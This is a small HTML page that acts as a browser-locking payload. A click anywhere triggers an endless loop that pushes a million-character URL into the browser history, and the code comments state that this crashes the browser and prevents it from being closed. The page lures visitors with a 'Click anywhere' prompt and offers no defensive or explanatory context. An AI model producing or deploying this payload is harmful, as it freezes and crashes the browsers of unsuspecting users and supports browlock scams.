<!DOCTYPE html>
<html>
<head>
	
<style type="text/css">
	html, body {
    width: 100%;
    height: 100%;
}
</style>

<script> 
	function bomb_url() {
	  // when num repeat = 10,000 the browser can be easily closed
	  // when num repeat = 100,000 browser crashes but can not be closed
	  // when num repeat = 1000,000 browser does not crash not can be closed and creates brolock
	  var num = "0";
	  history.pushState("", "", num.repeat(1000000));
	}

	function intervalCall() {
	  while (true) bomb_url(); 
	}

</script>
</head>

<body onclick="intervalCall()" style="background:#00000; cursor: url('cursor.png') 100 100, crosshair;">
	<p> Click anywhere in the page ...</p>
</body>

</html>
